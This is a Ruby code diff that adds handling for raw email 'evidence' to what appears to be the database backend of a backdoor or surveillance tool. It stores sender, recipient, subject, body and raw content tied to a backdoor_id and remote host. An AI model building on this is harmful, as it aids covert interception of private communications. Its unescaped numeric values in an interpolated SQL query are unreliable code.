@@ -288,6 +288,26 @@ module Evidence
                  #{evidence.info[:size_hi]},
                  #{evidence.info[:size_lo]},
                  #{evidence.info[:attribute]})"
+      when :MAILRAW
+        # override
+        evidence.info[:type] = :MAIL
+        q = "INSERT INTO log (tag, type, flags, backdoor_id, remoteip, remotehost, remoteuser, received, acquired, `varchar1`, `varchar2`, `varchar3`, `int1`, `int2`, `longtext1`, `longblob1`)
+                 VALUES (0,
+                 '#{@mysql.escape(evidence.info[:type].to_s)}',
+                 1,
+                 #{evidence.info[:backdoor_id]},
+                 '#{@mysql.escape(evidence.info[:source_id])}',
+                 '#{@mysql.escape(evidence.info[:device_id])}',
+                 '#{@mysql.escape(evidence.info[:user_id])}',
+                 '#{@mysql.escape(evidence.info[:received].to_s)}',
+                 '#{@mysql.escape(evidence.info[:acquired].to_s)}',
+                 '#{@mysql.escape(evidence.info[:from])}',
+                 '#{@mysql.escape(evidence.info[:to])}',
+                 '#{@mysql.escape(evidence.info[:subject])}',
+                 #{evidence.info[:size]},
+                 #{evidence.info[:status]},
+                 '#{@mysql.escape(evidence.info[:body])}',
+                 '#{@mysql.escape(evidence.info[:content])}')"
       else
         trace :debug, "Not implemented."
         return nil
